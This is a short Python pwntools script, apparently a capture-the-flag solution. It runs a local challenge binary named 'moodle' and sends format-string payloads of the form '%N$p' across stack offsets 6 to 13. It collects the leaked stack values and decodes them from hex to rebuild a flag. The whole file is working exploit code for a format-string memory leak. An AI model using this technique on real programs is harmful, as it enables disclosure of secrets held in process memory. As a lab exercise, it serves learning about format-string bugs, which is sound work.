#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './moodle'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'
host, port = '', 1337 # local no connection needed bruv


# =========================================================
#                           FUZZ
# =========================================================

flag = ''

for i in range(6, 14): # Range is obtained by fuzzing locally 
    try:
        # io = remote(host, port)
        io = process(exe)

        io.sendlineafter(b'x=', f'%{i}$p'.encode())
        io.recvline()
        leak = io.recvline()

        if not b'(nil)' in leak:
            print(f'stack at-{i}' + ": " + str(leak))
            try:
                hexform = unhex(leak.split()[0][2:].decode())
                flag += hexform.decode().strip()
                print("flag appended")
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print flag
print(f'{flag=}')